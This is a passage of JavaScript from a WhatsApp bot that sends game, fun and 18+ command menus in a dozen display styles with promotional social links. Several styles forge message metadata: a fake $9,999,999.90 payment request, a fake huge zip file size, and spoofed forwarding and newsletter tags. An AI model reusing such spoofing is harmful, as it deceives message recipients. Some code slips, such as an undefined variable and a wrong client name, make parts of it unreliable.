                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUTMENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_game': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${gamemenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_fun': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Sylvers.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"Cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-18': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
